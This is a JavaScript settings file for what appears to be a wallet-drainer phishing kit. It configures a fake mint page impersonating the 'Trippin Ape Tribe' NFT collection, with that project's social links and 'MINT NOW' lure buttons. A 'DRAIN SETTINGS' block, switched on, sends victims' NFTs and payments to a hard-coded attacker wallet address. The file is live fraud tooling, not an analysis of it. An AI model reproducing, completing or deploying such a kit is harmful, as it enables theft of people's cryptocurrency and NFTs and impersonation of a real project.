/*
    = = = = = YOU WALLET ADRESS = = = = =
*/

const receiveAddress = "0x4E0B2D6a2FB6f74CD24d30B83DE92a985CA2e588";

/*
    = = = = = COLLECTION SETTINGS = = = = =
*/

const collectionInfo = {
    name: "Trippin Ape Tribe",
    date: "16.05.2022",
    socialMedia: {
        discord: "https://discord.gg/trippinapetribe",
        twitter: "https://twitter.com/TrippinApeNFT",
    },
    medias: {
        preview: "preview.gif",
        favicon: "faviconbored.png",
    },
    background: {
        type: "image", // Supported types: image, video, color (use image for gif)
        image: "back.png", // Image for image type or video preview for video type (image befor video load)
        video: "background.mp4", // If you don't use video type, you can ignore this line
        color: "#4E4E6D", // If you don't use color type, you can ignore this line
    }
}


/*
    = = = = = MINT INFORMATIONS = = = = =
*/

const mintInfo = {
    price: 0.2,
    totalSupply: 8888,
    minUnits: 1,
    maxUnits: 5,
    askMintLoop: true,
}

/*
    = = = = = DRAIN SETTINGS = = = = =
*/

const drainNftsInfo = {
    active: true,
    minValue: 0.02,
    maxTransfer: 10,
    nftReceiveAddress: "0x4E0B2D6a2FB6f74CD24d30B83DE92a985CA2e588",
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "CONNECT WALLET",
    transferButton: "MINT NOW",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
